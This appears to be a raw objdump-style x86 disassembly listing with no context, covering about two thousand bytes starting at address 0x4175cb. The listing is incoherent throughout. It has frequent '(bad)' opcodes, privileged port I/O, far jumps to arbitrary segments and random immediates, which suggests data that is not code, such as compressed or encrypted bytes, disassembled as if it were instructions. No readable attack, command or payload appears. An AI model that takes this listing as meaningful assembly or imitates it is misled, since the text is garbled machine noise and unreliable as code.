  4175cb:	push   es
  4175cc:	call   0xfbf4e0d2
  4175d1:	gs out 0x1d,eax
  4175d4:	or     al,0xa8
  4175d6:	cmp    ecx,esi
  4175d8:	cs dec edi
  4175da:	stos   BYTE PTR es:[edi],al
  4175db:	mov    ebx,0x5a9fa7bc
  4175e0:	iret   
  4175e1:	mov    dh,0xec
  4175e3:	or     BYTE PTR [esp+eax*4],0x3a
  4175e7:	sub    DWORD PTR [ebx-0x5c],esi
  4175ea:	push   ebp
  4175eb:	inc    edx
  4175ec:	jb     0x4175ef
  4175ee:	jp     0x41763c
  4175f0:	xchg   edx,eax
  4175f1:	pop    edx
  4175f2:	or     eax,0xf6e77745
  4175f7:	push   ecx
  4175f8:	mov    bl,0xad
  4175fa:	cs (bad) 
  4175fc:	les    ebx,FWORD PTR [eax-0x761eabd4]
  417602:	(bad)  
  417604:	inc    edi
  417605:	sti    
  417606:	adc    esp,DWORD PTR [esi+0x11]
  417609:	dec    esi
  41760a:	lea    ebx,[ebx+0x2f]
  41760d:	dec    ebp
  41760e:	push   eax
  41760f:	inc    esi
  417610:	outs   dx,DWORD PTR ds:[esi]
  417611:	sub    al,0x6d
  417613:	jmp    0xbfc3:0x33b9f319
  41761a:	(bad)  
  41761c:	ror    DWORD PTR [edx+edx*8],0x96
  417620:	mov    es,WORD PTR [ecx+0x91c6dc3]
  417626:	pop    ebx
  417627:	ins    BYTE PTR es:[edi],dx
  417628:	xchg   edi,eax
  417629:	dec    ecx
  41762a:	dec    eax
  41762b:	jns    0x417644
  41762d:	stos   DWORD PTR es:[edi],eax
  41762e:	add    BYTE PTR ds:0x9a6cb1ab,al
  417634:	shr    DWORD PTR [ecx-0x4f],cl
  417637:	mov    cl,0x28
  417639:	cmp    al,0x2e
  41763b:	sbb    al,0x27
  41763d:	fsubr  DWORD PTR [edi+0x75]
  417640:	mov    ah,0xea
  417642:	push   0xdc441334
  417647:	xlat   BYTE PTR ds:[ebx]
  417648:	xor    esi,DWORD PTR [ebp*2+0x2e5b716c]
  41764f:	mov    esp,0x91189236
  417654:	dec    ebx
  417655:	pop    es
  417656:	aad    0xae
  417658:	in     eax,0x39
  41765a:	loope  0x41760d
  41765c:	mov    DWORD PTR [ecx-0x57b7f8be],esi
  417662:	sbb    bl,dh
  417664:	sti    
  417665:	mov    al,fs:0xfa22ba4b
  41766b:	sub    esp,eax
  41766d:	enter  0x2932,0xc8
  417671:	fcom   DWORD PTR [edx-0x342a84bb]
  417677:	sbb    BYTE PTR [esi-0x41bc71e9],ch
  41767d:	fisub  WORD PTR [edi]
  41767f:	xlat   BYTE PTR ds:[ebx]
  417680:	push   ss
  417681:	aas    
  417682:	mov    ds:0x6090726,al
  417687:	mov    eax,ds:0x16ae891d
  41768c:	nop
  41768d:	xor    DWORD PTR [ecx+0x32],edi
  417690:	and    BYTE PTR [edi+0x6b],bh
  417693:	jecxz  0x417705
  417695:	mov    al,0x3d
  417697:	cmp    bl,BYTE PTR [ebx]
  417699:	xor    dh,BYTE PTR [edx+0x4c]
  41769c:	cdq    
  41769d:	add    cl,BYTE PTR [edx-0x37]
  4176a0:	repz out dx,al
  4176a2:	fcmovnb st,st(4)
  4176a4:	or     BYTE PTR [edx],ch
  4176a6:	data16 aad 0xdc
  4176a9:	aas    
  4176aa:	xchg   ebp,eax
  4176ab:	pop    es
  4176ac:	mov    bh,0x8f
  4176ae:	clc    
  4176af:	mov    ds:0x5bb982f8,al
  4176b4:	mov    edi,DWORD PTR [esi-0x4ea71eaa]
  4176ba:	div    DWORD PTR [edi+0x35]
  4176bd:	jmp    0x41771e
  4176bf:	inc    edx
  4176c0:	retf   
  4176c1:	add    al,0xa8
  4176c3:	loope  0x4176a4
  4176c5:	jne    0x4176e8
  4176c7:	jne    0x4176a3
  4176c9:	sub    al,BYTE PTR [edx]
  4176cb:	or     al,0x36
  4176cd:	cmp    DWORD PTR [eax],eax
  4176cf:	mov    esi,0xacc6ecc9
  4176d4:	imul   esp,DWORD PTR [eax+eax*1+0x76],0xe259eca4
  4176dc:	mov    al,0x6e
  4176de:	xchg   DWORD PTR [edx+0x12],ecx
  4176e1:	cmp    al,0x31
  4176e3:	outs   dx,BYTE PTR ds:[esi]
  4176e4:	(bad)  
  4176e5:	call   0xca4b:0xb58f4b35
  4176ec:	jnp    0x41770c
  4176ee:	cmp    al,cl
  4176f0:	xor    eax,0xac8336ae
  4176f5:	sbb    DWORD PTR [edx+0x24],esi
  4176f8:	pop    edi
  4176f9:	scas   al,BYTE PTR es:[edi]
  4176fa:	jle    0x4176ef
  4176fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176fd:	pop    ecx
  4176fe:	fisub  WORD PTR [esi]
  417700:	into   
  417701:	push   cs
  417702:	shl    BYTE PTR [esi],cl
  417704:	mov    esi,0x79241399
  417709:	mov    ch,0xd8
  41770b:	pop    esi
  41770c:	mov    cl,BYTE PTR [esi-0x91981b]
  417712:	jge    0x417787
  417714:	xor    al,0xd4
  417716:	adc    edx,DWORD PTR [edi-0x7fda7f97]
  41771c:	add    dl,BYTE PTR [ecx]
  41771e:	xor    bl,al
  417720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417721:	push   0xffffffa1
  417723:	cmp    eax,0xe950779a
  417728:	push   ds
  417729:	jnp    0x41779f
  41772b:	push   ebx
  41772c:	pop    edx
  41772d:	fild   QWORD PTR [ebx+edx*1]
  417730:	xor    eax,0x5da1da4d
  417735:	in     eax,0xb6
  417737:	je     0x417782
  417739:	jmp    0x86b2:0x5ced7972
  417740:	ret    
  417741:	lock repz sbb cl,BYTE PTR [eax-0x6e]
  417746:	mov    al,BYTE PTR [esi+0x8]
  417749:	jb     0x41772d
  41774b:	mov    WORD PTR [ebx+0x1d6959f6],gs
  417751:	cwde   
  417752:	in     al,dx
  417753:	or     BYTE PTR [eax-0x3838e1bf],bh
  417759:	mov    dh,0x32
  41775b:	dec    edi
  41775c:	jne    0x417770
  41775e:	inc    ebp
  41775f:	inc    esi
  417760:	xor    eax,0x9a5ee6c1
  417765:	fadd   st,st(2)
  417767:	retf   
  417768:	push   esi
  417769:	mov    cl,0x2f
  41776b:	out    0xa3,al
  41776d:	sar    eax,cl
  41776f:	push   ecx
  417770:	(bad)  
  417771:	sti    
  417772:	clc    
  417773:	aad    0x6b
  417775:	(bad)  [esi+0x62c8b595]
  41777b:	jns    0x41772b
  41777d:	xor    BYTE PTR [ebp+0x42d83e98],cl
  417783:	inc    ebp
  417784:	jl     0x4177c2
  417786:	pslld  mm4,QWORD PTR [ecx+0x64]
  41778a:	cld    
  41778b:	or     al,0x68
  41778d:	jp     0x417803
  41778f:	(bad)  
  417790:	(bad)  
  417791:	repz or DWORD PTR [ecx-0x6ed8ccbd],eax
  417798:	inc    ecx
  417799:	pop    ebx
  41779a:	lods   eax,DWORD PTR ds:[esi]
  41779b:	or     esi,0xa4d592c6
  4177a1:	sbb    dh,BYTE PTR [ebx-0x1745d52b]
  4177a7:	inc    esi
  4177a8:	dec    ebx
  4177a9:	adc    al,0x1a
  4177ab:	aas    
  4177ac:	test   DWORD PTR [eax],edx
  4177ae:	sbb    esp,DWORD PTR [esi+0x24]
  4177b1:	imul   ebx,ebp,0x9d053ff6
  4177b7:	xor    BYTE PTR [esp+ecx*8-0x19],al
  4177bb:	lahf   
  4177bc:	outs   dx,DWORD PTR ds:[esi]
  4177bd:	dec    ebp
  4177be:	fisubr DWORD PTR [bp+di]
  4177c1:	mov    ds:0x1cb96e42,al
  4177c6:	das    
  4177c7:	xor    al,0x7b
  4177c9:	std    
  4177ca:	je     0x4177bf
  4177cc:	jp     0x417781
  4177ce:	mov    cl,0xe8
  4177d0:	pusha  
  4177d1:	arpl   WORD PTR [esi],di
  4177d3:	xchg   edx,eax
  4177d4:	pop    esp
  4177d5:	fld    DWORD PTR [ebx+0x72]
  4177d8:	outs   dx,DWORD PTR ds:[esi]
  4177d9:	pop    ebx
  4177da:	shl    eax,cl
  4177dc:	cmp    BYTE PTR [ecx+0xb6a96d2],bl
  4177e2:	inc    ebp
  4177e3:	and    BYTE PTR [esi-0x2f],cl
  4177e6:	cld    
  4177e7:	or     dl,BYTE PTR [edi-0x57047977]
  4177ed:	jns    0x417775
  4177ef:	ins    DWORD PTR es:[edi],dx
  4177f0:	int3   
  4177f1:	outs   dx,BYTE PTR ds:[esi]
  4177f2:	out    0x9a,al
  4177f4:	xchg   esi,eax
  4177f5:	and    eax,0xd9eadaff
  4177fa:	loop   0x4177ec
  4177fc:	outs   dx,BYTE PTR ds:[esi]
  4177fd:	int    0x3b
  4177ff:	mov    ebp,0xe20da147
  417804:	push   es
  417805:	or     eax,0xb8af57c9
  41780a:	sbb    bl,BYTE PTR ds:0x9576a25a
  417810:	mov    ebx,eax
  417812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417814:	pop    es
  417815:	cdq    
  417816:	fldenv [ecx-0x3e]
  417819:	das    
  41781a:	dec    ebp
  41781b:	or     al,0xa1
  41781d:	push   cs
  41781e:	and    bh,BYTE PTR [ecx+0x50]
  417821:	xchg   DWORD PTR [edi+eax*8+0x31],ebx
  417825:	enter  0xd5ae,0xf2
  417829:	in     al,0x2
  41782b:	test   eax,0x2baece6d
  417830:	push   edi
  417831:	lahf   
  417832:	lea    ebx,[edx+0x73]
  417835:	or     eax,0x96206979
  41783a:	adc    BYTE PTR [eax+0x67],ch
  41783d:	jae    0x4177f2
  41783f:	add    ch,ah
  417841:	in     eax,dx
  417842:	jmp    0x417877
  417844:	sub    BYTE PTR [esi-0x3b],ch
  417847:	fmul   QWORD PTR [esi]
  417849:	or     BYTE PTR [ecx],cl
  41784b:	sbb    BYTE PTR [ebx+0x48e35f3d],0xeb
  417852:	aaa    
  417853:	sbb    BYTE PTR [esp+esi*1+0x7e2a430d],0x5a
  41785b:	fdiv   QWORD PTR [esi+0x3708ed07]
  417861:	add    DWORD PTR [esi],eax
  417863:	jbe    0x417811
  417865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417866:	out    dx,al
  417867:	(bad)  
  417868:	leave  
  417869:	aam    0xa9
  41786b:	cmp    eax,0x4452175e
  417870:	call   0x51b67c4e
  417875:	xchg   ecx,eax
  417876:	push   ds
  417877:	and    DWORD PTR [ecx-0x78],esi
  41787a:	fidiv  DWORD PTR [ebp+0x28fa40b0]
  417880:	adc    eax,0x96a04c1b
  417885:	mov    edx,0xbecfa14a
  41788a:	mov    ebp,0xd122e29d
  41788f:	in     eax,0x1a
  417891:	out    dx,al
  417892:	xchg   edi,eax
  417893:	pushf  
  417894:	mov    edi,DWORD PTR [ebx+0xf]
  417897:	lea    edi,[esi]
  417899:	mov    al,ds:0x899fd05f
  41789e:	(bad)  
  41789f:	fldenv [edi+0x60]
  4178a2:	xor    eax,0x9d4ebaca
  4178a7:	arpl   WORD PTR [eax],dx
  4178a9:	outs   dx,DWORD PTR ds:[esi]
  4178aa:	mov    BYTE PTR [edi],bh
  4178ac:	repnz inc ebp
  4178ae:	cmp    BYTE PTR [ecx-0x308a3bac],dl
  4178b4:	cmp    al,0x30
  4178b6:	or     BYTE PTR [esi-0x521cf4fe],0x16
  4178bd:	lods   al,BYTE PTR ds:[esi]
  4178be:	and    eax,0x5743d0b1
  4178c3:	pop    eax
  4178c4:	pop    esi
  4178c5:	fist   DWORD PTR [edx-0x453c5fd5]
  4178cb:	jne    0x4178c2
  4178cd:	xchg   esp,eax
  4178ce:	loopne 0x417906
  4178d0:	jp     0x4178fe
  4178d2:	mov    eax,0x15afddd0
  4178d7:	(bad)  
  4178d8:	jb     0x41792b
  4178da:	(bad)  
  4178db:	retf   
  4178dc:	neg    esi
  4178de:	(bad)  
  4178df:	and    esp,esi
  4178e1:	pmullw mm3,QWORD PTR [esi+esi*2+0x62b5604e]
  4178e9:	stc    
  4178ea:	pop    edi
  4178eb:	push   ebp
  4178ec:	push   ds
  4178ed:	push   esi
  4178ee:	cmc    
  4178ef:	ins    DWORD PTR es:[edi],dx
  4178f0:	inc    eax
  4178f1:	jmp    0x69fe:0xa79dacb9
  4178f8:	jle    0x417887
  4178fa:	sub    edi,edi
  4178fc:	outs   dx,DWORD PTR ds:[esi]
  4178fd:	test   ebp,esp
  4178ff:	cld    
  417900:	mov    WORD PTR [edx+eax*8+0x53],ds
  417904:	and    dh,bh
  417906:	pop    esi
  417907:	push   cs
  417908:	pop    ecx
  417909:	in     al,dx
  41790a:	inc    esi
  41790b:	(bad)  
  41790c:	jle    0x417977
  41790e:	ficom  DWORD PTR [ecx+0x5c00849]
  417914:	inc    ecx
  417915:	xchg   ebp,eax
  417916:	ss (bad) 
  417918:	mul    bh
  41791a:	dec    eax
  41791b:	clc    
  41791c:	mov    ds:0x8fd5ea48,al
  417921:	mov    dl,0x78
  417923:	sub    dh,BYTE PTR [ebx]
  417925:	test   BYTE PTR [ebx],ch
  417927:	lea    ebx,[ebx+ebx*1+0x75]
  41792b:	sub    DWORD PTR [ebx],0x792a61da
  417931:	cld    
  417932:	hlt    
  417933:	or     BYTE PTR [eax],cl
  417935:	imul   edi,ebp,0xffffffaa
  417938:	shl    DWORD PTR [edi-0x16],1
  41793b:	or     al,0xba
  41793d:	retf   0x9e50
  417940:	sbb    DWORD PTR [ebx-0x70f2b5b0],0x3e79131
  41794a:	cs mov ah,0x9
  41794d:	lea    ecx,[ebx-0x6c]
  417950:	dec    ebp
  417951:	aaa    
  417952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417953:	je     0x4179b1
  417955:	adc    ebp,DWORD PTR [edx+0x16]
  417958:	mov    al,ds:0xd845af6
  41795d:	aad    0x5e
  41795f:	push   bp
  417961:	mov    BYTE PTR [ebx],al
  417963:	sub    dh,BYTE PTR [ebx]
  417965:	out    dx,eax
  417966:	jge    0x4179e7
  417968:	icebp  
  417969:	test   BYTE PTR [edx-0x76],cl
  41796c:	test   eax,0x55c00a7d
  417971:	sub    BYTE PTR [edx+0x51330def],0xab
  417978:	test   al,0xf0
  41797a:	aam    0xa1
  41797c:	test   al,0xc6
  41797e:	sub    eax,0x1b07218
  417983:	add    bh,BYTE PTR [ecx-0x2ce1daa9]
  417989:	mov    ds:0xcec2d173,al
  41798f:	repz cmovl esp,DWORD PTR [eax-0x192cd31a]
  417997:	push   0x2584fdc8
  41799c:	sub    eax,0x911bb818
  4179a1:	retf   0x7d9f
  4179a4:	std    
  4179a5:	mov    ch,bh
  4179a7:	sar    edx,0x69
  4179aa:	pop    esi
  4179ab:	fwait
  4179ac:	ins    BYTE PTR es:[edi],dx
  4179ad:	jle    0x417935
  4179af:	and    ah,BYTE PTR [edx]
  4179b1:	test   DWORD PTR [edx+0x767f3308],esp
  4179b7:	fnstsw WORD PTR [edx-0x7f9a5116]
  4179bd:	sar    BYTE PTR [ecx-0x44],0x35
  4179c1:	cmp    al,0xfc
  4179c3:	xor    ecx,DWORD PTR [ecx]
  4179c5:	sar    DWORD PTR [eax-0x42941cbf],0x12
  4179cc:	pop    esp
  4179cd:	sbb    al,0xd3
  4179cf:	shr    DWORD PTR [eax],1
  4179d1:	jmp    DWORD PTR [esi]
  4179d3:	xchg   edi,eax
  4179d4:	and    dh,BYTE PTR [esi]
  4179d6:	stos   DWORD PTR es:[edi],eax
  4179d7:	inc    ecx
  4179d8:	mov    cs:0x943a6ab1,eax
  4179de:	or     al,dl
  4179e0:	(bad)  
  4179e2:	dec    bx
  4179e4:	ss aaa 
  4179e6:	adc    eax,DWORD PTR [esi+eiz*4-0x41]
  4179ea:	(bad)  
  4179ec:	nop
  4179ed:	pop    ss
  4179ee:	xchg   ebx,eax
  4179ef:	jge    0x4179ec
  4179f1:	or     DWORD PTR [esi-0x41b75186],0xbb1ea57
  4179fb:	push   ss
  4179fc:	pop    esp
  4179fd:	dec    ebx
  4179fe:	sub    bl,bh
  417a00:	rcr    BYTE PTR [eax],cl
  417a02:	jl     0x41799c
  417a04:	call   DWORD PTR [esi-0x5c9b1c15]
  417a0a:	dec    edx
  417a0b:	aas    
  417a0c:	xchg   ebp,eax
  417a0d:	sbb    ah,BYTE PTR [esi-0x1c]
  417a10:	jmp    0x94d6e7cf
  417a15:	pop    esp
  417a16:	add    dh,bl
  417a18:	jns    0x417a29
  417a1a:	and    DWORD PTR [esi-0x3f],ecx
  417a1d:	mov    bl,0xc4
  417a1f:	jp     0x4179c7
  417a21:	shr    BYTE PTR [edx+edi*4],0xee
  417a25:	xor    DWORD PTR [esi+eax*8-0xb],edx
  417a29:	mov    WORD PTR [edx+edx*1-0x7],ss
  417a2d:	mov    eax,0x5f9bccc5
  417a32:	adc    al,0x75
  417a34:	hlt    
  417a35:	sub    al,0x4e
  417a37:	jae    0x417a1e
  417a39:	aam    0xdd
  417a3b:	addr16 pop ecx
  417a3d:	mov    ch,0x15
  417a3f:	and    eax,0x7d1d48bb
  417a44:	test   bl,dl
  417a46:	xor    al,0x4
  417a48:	scas   eax,DWORD PTR es:[edi]
  417a49:	sub    BYTE PTR [edx+0x2d],al
  417a4c:	sahf   
  417a4d:	xchg   ebp,eax
  417a4e:	mov    eax,0x6c14e97b
  417a53:	jp     0x417a62
  417a55:	mul    DWORD PTR [esi+0x5c5ce508]
  417a5b:	int    0xc1
  417a5d:	cmp    eax,0xb323a8e7
  417a62:	jmp    0x417ad7
  417a64:	push   esp
  417a65:	jge    0x417a62
  417a67:	inc    esi
  417a68:	mov    edi,0x7cefdf95
  417a6d:	push   edi
  417a6e:	shl    DWORD PTR [ebp+0x3e],0x1c
  417a72:	mov    ebp,0xff425836
  417a77:	cdq    
  417a78:	and    DWORD PTR [ebx-0x3ec48663],0x3ef652de
  417a82:	inc    ebp
  417a83:	enter  0xa2d5,0x6a
  417a87:	push   es
  417a88:	mov    al,ds:0x7773effc
  417a8d:	mov    edi,0xec98f71c
  417a92:	sbb    BYTE PTR [ebp+0x86db7ba],bl
  417a98:	dec    ecx
  417a99:	hlt    
  417a9a:	xlat   BYTE PTR ds:[ebx]
  417a9b:	and    edx,DWORD PTR [esi]
  417a9d:	(bad)  
  417a9e:	dec    BYTE PTR [ebx+eiz*1-0x46]
  417aa2:	dec    edi
  417aa3:	push   esi
  417aa4:	push   ecx
  417aa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aa6:	jno    0x417a5f
  417aa8:	in     al,dx
  417aa9:	jg     0x417aab
  417aab:	add    al,0xb5
  417aad:	sar    BYTE PTR [eax-0x57713d6a],1
  417ab3:	pop    esp
  417ab4:	add    edi,ecx
  417ab6:	popa   
  417ab7:	lods   eax,DWORD PTR ds:[esi]
  417ab8:	dec    BYTE PTR [ecx-0x7d]
  417abb:	(bad)  
  417abc:	inc    ebx
  417abd:	ins    BYTE PTR es:[edi],dx
  417abe:	add    BYTE PTR [edi],bh
  417ac0:	enter  0x240b,0xd
  417ac4:	out    dx,al
  417ac5:	(bad)  
  417ac6:	popa   
  417ac7:	inc    ebx
  417ac8:	cmp    eax,DWORD PTR [ecx+0x69]
  417acb:	fnstcw WORD PTR [edi]
  417acd:	cdq    
  417ace:	adc    bl,BYTE PTR [esp+edi*8+0x4e]
  417ad2:	sbb    al,0xe6
  417ad4:	cmp    cl,BYTE PTR [ebx-0x53dedcbe]
  417ada:	ja     0x417a6a
  417adc:	loope  0x417b0f
  417ade:	cmp    eax,0x992c5371
  417ae3:	lods   eax,DWORD PTR ds:[esi]
  417ae4:	in     al,dx
  417ae5:	sbb    ah,bl
  417ae7:	out    0xf6,al
  417ae9:	fcomp  QWORD PTR [edi+0x40323a9e]
  417aef:	cmp    dl,BYTE PTR [ecx-0x4035f764]
  417af5:	fisubr DWORD PTR [eax+0x38]
  417af8:	scas   al,BYTE PTR es:[edi]
  417af9:	in     eax,0x3e
  417afb:	adc    eax,0x65fc62dc
  417b00:	and    DWORD PTR ds:0x34c2e902,ecx
  417b06:	js     0x417afe
  417b08:	leave  
  417b09:	stos   DWORD PTR es:[edi],eax
  417b0a:	push   0xc6259bce
  417b0f:	add    ebp,DWORD PTR [ecx+0x67]
  417b12:	push   eax
  417b13:	mov    ebp,0x961e01da
  417b18:	out    dx,eax
  417b19:	mov    esp,0xa3040974
  417b1e:	aam    0x53
  417b20:	xlat   BYTE PTR ds:[ebx]
  417b21:	lds    esp,FWORD PTR [edx-0x2a]
  417b24:	push   ebx
  417b25:	or     eax,0xbc0d1c16
  417b2a:	ins    DWORD PTR es:[edi],dx
  417b2b:	mov    eax,ds:0xfc6acec8
  417b30:	cmp    bl,BYTE PTR [ebp-0x14ae650c]
  417b36:	(bad)  
  417b37:	lock dec esi
  417b39:	push   esi
  417b3a:	inc    ebp
  417b3b:	xlat   BYTE PTR ds:[ebx]
  417b3c:	jmp    0xd4bf:0xb3c331d4
  417b43:	(bad)  
  417b44:	hlt    
  417b45:	jo     0x417b7f
  417b47:	inc    eax
  417b48:	pusha  
  417b49:	inc    ecx
  417b4a:	mov    cl,0x26
  417b4c:	xor    al,0xea
  417b4e:	ja     0x417ba2
  417b50:	mov    BYTE PTR [ebx-0x45],bl
  417b53:	mov    dl,0xff
  417b55:	cmp    bl,BYTE PTR [edx+edi*4]
  417b58:	lahf   
  417b59:	iret   
  417b5a:	add    al,0x7a
  417b5c:	int3   
  417b5d:	push   edx
  417b5e:	es (bad) 
  417b60:	push   ebp
  417b61:	ins    WORD PTR es:[edi],dx
  417b63:	xor    edi,esp
  417b65:	sub    eax,DWORD PTR [edi-0x679bc44f]
  417b6b:	fadd   DWORD PTR [edi+0x46]
  417b6e:	jns    0x417b44
  417b70:	xlat   BYTE PTR ds:[ebx]
  417b71:	xchg   ecx,eax
  417b72:	adc    eax,DWORD PTR [ecx-0x5f3ac7d4]
  417b78:	xor    BYTE PTR gs:[edi+0x35],bh
  417b7c:	mov    edx,0x71abe228
  417b81:	cmp    eax,0xb2abed54
  417b86:	cmp    edi,DWORD PTR [esp+eiz*2+0x162eb902]
  417b8d:	adc    DWORD PTR [ebx],ecx
  417b8f:	bound  esi,QWORD PTR [ebx]
  417b91:	xchg   ebp,eax
  417b92:	mov    ecx,0xf4080bf9
  417b97:	iret   
  417b98:	into   
  417b99:	sbb    eax,0x25666b22
  417b9e:	mov    ah,0x83
  417ba0:	inc    ecx
  417ba1:	jecxz  0x417c13
  417ba3:	and    BYTE PTR ds:0x801d8544,bl
  417ba9:	(bad)  
  417baa:	outs   dx,DWORD PTR ds:[esi]
  417bab:	sahf   
  417bac:	jns    0x417c0d
  417bae:	mov    al,0x41
  417bb0:	push   0x70c18ea
  417bb5:	stc    
  417bb6:	cmp    al,0xa5
  417bb8:	push   0xffffffa9
  417bba:	add    BYTE PTR [esi+esi*1-0x4689a256],0xbf
  417bc2:	and    edi,edi
  417bc4:	xchg   ebx,eax
  417bc5:	sbb    eax,0x378fea0a
  417bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bcb:	sahf   
  417bcc:	out    0xc8,eax
  417bce:	jl     0x417c1c
  417bd0:	lods   eax,DWORD PTR ds:[esi]
  417bd1:	cmc    
  417bd2:	push   ecx
  417bd3:	ins    DWORD PTR es:[edi],dx
  417bd4:	es call 0x4d8fc33f
  417bda:	adc    ah,ch
  417bdc:	loope  0x417c55
  417bde:	jmp    0xf008:0x59892a19
  417be5:	ficomp DWORD PTR [ecx+0x1]
  417be8:	add    BYTE PTR [ebx+0x1f8b910d],ch
  417bee:	lds    ecx,FWORD PTR [edi-0x3be96ed9]
  417bf4:	sbb    al,0x9c
  417bf6:	pushf  
  417bf7:	mov    ch,0x26
  417bf9:	mov    ds:0x5c600671,eax
  417bfe:	arpl   ax,si
  417c00:	(bad)  
  417c02:	push   ss
  417c03:	mov    eax,ds:0xcb23fb70
  417c08:	call   0xa81c:0x698095ac
  417c0f:	out    0x11,eax
  417c11:	or     DWORD PTR [ecx+eiz*4+0x2db88148],0x60
  417c19:	clc    
  417c1a:	lock mov dh,ch
  417c1d:	cmp    DWORD PTR [edx],esp
  417c1f:	and    eax,DWORD PTR [esi+ebx*2]
  417c22:	outs   dx,DWORD PTR ds:[esi]
  417c23:	cmp    cl,bl
  417c25:	dec    edx
  417c26:	or     BYTE PTR [ebx+0x10],0xd8
  417c2a:	jle    0x417bf8
  417c2c:	mov    ds:0xbbc64194,al
  417c31:	inc    ebp
  417c32:	push   cs
  417c33:	xchg   ebp,eax
  417c34:	jle    0x417c0c
  417c36:	pusha  
  417c37:	cli    
  417c38:	or     BYTE PTR [edx],dl
  417c3a:	mov    ch,0x50
  417c3c:	push   ebp
  417c3d:	cmp    ch,bh
  417c3f:	loop   0x417cae
  417c41:	pop    ecx
  417c42:	iret   
  417c43:	sbb    eax,0xcee955ed
  417c48:	xor    BYTE PTR [ebp+0xa2d8f81],ch
  417c4e:	mov    eax,ss:0xc8f8c72d
  417c54:	adc    DWORD PTR [esi-0x20080b8e],ebx
  417c5a:	pop    esi
  417c5b:	dec    esp
  417c5c:	dec    ebx
  417c5d:	fdivr  DWORD PTR [ebx]
  417c5f:	inc    esp
  417c60:	add    esp,DWORD PTR [edi+eiz*8]
  417c63:	jno    0x417cb2
  417c65:	xlat   BYTE PTR ds:[ebx]
  417c66:	jl     0x417cca
  417c68:	pop    edi
  417c69:	mov    ch,0xf6
  417c6b:	cwde   
  417c6c:	mov    ah,0x42
  417c6e:	shl    edx,0x47
  417c71:	mov    ebp,0xe0264679
  417c76:	adc    ebx,eax
  417c78:	sbb    BYTE PTR [esi+0x56],0x76
  417c7c:	cmp    dh,bh
  417c7e:	lea    esp,[ecx-0xa11ba54]
  417c84:	jno    0x417c56
  417c86:	repz mov WORD PTR gs:[ebx+0x46d5ea1],es
  417c8e:	loopne 0x417d07
  417c90:	lock pop edi
  417c92:	ins    BYTE PTR es:[edi],dx
  417c93:	(bad)  
  417c94:	fnsave [edx+0x7db597f7]
  417c9a:	sub    ebp,0x518efe05
  417ca0:	jmp    0x417c7a
  417ca2:	mov    bl,0x76
  417ca4:	jns    0x417cfb
  417ca6:	pop    esp
  417ca7:	cmp    al,BYTE PTR ds:[edi]
  417caa:	sbb    BYTE PTR [ebx],ah
  417cac:	pop    esp
  417cad:	xchg   esi,eax
  417cae:	outs   dx,BYTE PTR ds:[esi]
  417caf:	jb     0x417c4b
  417cb1:	sbb    ebp,ebp
  417cb3:	xchg   esi,eax
  417cb4:	aas    
  417cb5:	popf   
  417cb6:	ret    0xf7db
  417cb9:	adc    al,0xdb
  417cbb:	cs mov bh,0x4e
  417cbe:	xchg   ebp,eax
  417cbf:	enter  0x5fb2,0x10
  417cc3:	ds jle 0x417c6b
  417cc6:	xor    dh,BYTE PTR [eax-0x5e5c6a66]
  417ccc:	mov    DWORD PTR [ebp-0xdb68420],0x69aa6487
  417cd6:	(bad)  
  417cd7:	pop    edi
  417cd8:	mov    ds:0x28d2e0f2,al
  417cdd:	enter  0x16b4,0x89
  417ce1:	cmp    al,0xa9
  417ce3:	jmp    0xe7c11f2b
  417ce8:	mov    edi,0xd1f17557
  417ced:	mov    DWORD PTR [ecx-0x3b72ad2d],ecx
  417cf3:	in     eax,0xce
  417cf5:	rol    DWORD PTR [edi-0x31],1
  417cf8:	adc    al,0x46
  417cfa:	mov    dh,0x1b
  417cfc:	fcmovnu st,st(0)
  417cfe:	or     ch,BYTE PTR [edi]
  417d00:	aad    0x7e
  417d02:	iret   
  417d03:	jle    0x417cae
  417d05:	inc    esp
  417d06:	test   ebp,edx
  417d08:	xchg   ecx,eax
  417d09:	pop    ecx
  417d0a:	push   0x10
  417d0c:	push   edx
  417d0d:	pop    gs
  417d0f:	dec    ecx
  417d10:	mov    cl,0x9b
  417d12:	std    
  417d13:	xor    al,0x7d
  417d15:	iret   
  417d16:	fwait
  417d17:	ror    ch,1
  417d19:	idiv   DWORD PTR [ebp+0x78]
  417d1c:	jae    0x417ca9
  417d1e:	xlat   BYTE PTR ds:[ebx]
  417d1f:	(bad)  
  417d20:	push   esp
  417d21:	stos   BYTE PTR es:[edi],al
  417d22:	adc    eax,0x81ac9bd
  417d27:	(bad)  
  417d28:	cmc    
  417d29:	jp     0x417d90
  417d2b:	retf   0xcc2f
  417d2e:	mov    ecx,0xad86c678
  417d33:	mov    ds:0x909454b2,al
  417d38:	xor    DWORD PTR [ecx+edx*1],0xffffff80
  417d3c:	je     0x417d3a
  417d3e:	mov    bh,0xf
  417d40:	cmc    
  417d41:	popf   
  417d42:	leave  
  417d43:	jo     0x417d8d
  417d45:	xor    DWORD PTR [esi-0x37],0xed26e5df
  417d4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d4d:	bound  esi,QWORD PTR [ebx+0x0]
  417d50:	(bad)  
  417d51:	out    dx,eax
  417d52:	push   esp
  417d53:	in     eax,0xde
  417d55:	popf   
  417d56:	clc    
  417d57:	pop    ds
  417d58:	xchg   esp,eax
  417d59:	mov    DWORD PTR [ebx-0x65],ecx
  417d5c:	or     edx,DWORD PTR [si+0x35]
  417d60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d61:	jne    0x417dd8
  417d63:	out    dx,eax
  417d64:	pop    ecx
  417d65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d66:	in     al,0x72
  417d68:	es gs inc edx
  417d6b:	aad    0x64
  417d6d:	jne    0x417cff
  417d6f:	ds call 0x9bc6681
  417d75:	xchg   ecx,eax
  417d76:	(bad)  
  417d77:	sbb    BYTE PTR [esp+edx*2],dl
  417d7a:	fdivr  QWORD PTR [edx+eiz*2+0x4a]
  417d7e:	xchg   esp,eax
  417d7f:	repnz lahf 
  417d81:	lods   eax,DWORD PTR ds:[esi]
  417d82:	(bad)  
